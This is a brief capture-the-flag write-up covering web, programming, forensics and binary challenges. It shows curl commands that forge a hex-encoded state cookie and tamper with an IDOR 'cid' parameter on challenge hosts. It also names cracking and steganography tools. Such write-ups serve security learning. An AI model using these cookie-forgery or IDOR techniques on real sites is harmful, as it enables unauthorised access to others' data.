## Web 3

```
curl -i https://actf.xyz/chalfiles/wetpaperbag/
HTTP/1.1 200 OK
...
Set-Cookie: STATE=696e5f70617065725f6261673d74727565
...
```

```
>> print('696e5f70617065725f6261673d74727565'.decode('hex'))
in_paper_bag=true
>> print('in_paper_bag=false'.encode('hex'))
696e5f70617065725f6261673d66616c7365
```

```bash
curl -i https://actf.xyz/chalfiles/wetpaperbag/ -H 'Cookie: STATE=696e5f70617065725f6261673d66616c7365'
```

## Web 4

IDOR type bug. Look at XHR to get data and change `cid`.

```bash
curl -i "https://actf.xyz/chalfiles/webcustomer/?cid=1"
```

## Programming 2: Opposites

Python script for challenge response (opposite.py).

## Programming 3

Built on the same framework as the previous challenge response.

I didn't bother using OCR, instead I quickly answer a terminal prompt. Luckily there aren't too many challenges.

Code in programming3-b64.py

[![asciicast](https://asciinema.org/a/QNv7EqKmjxK6LGdfmSyWYqhox.svg)](https://asciinema.org/a/QNv7EqKmjxK6LGdfmSyWYqhox)

## Forensics 1

Use stegsolve.jar, see image.

## Forensics 2

Use `john`.


## Binary Challenge 1: CashMachine

It's a .NET v4.5 executable.

Running `strings -e l` will find the utf-16 strings which are not picked up by default `strings`.
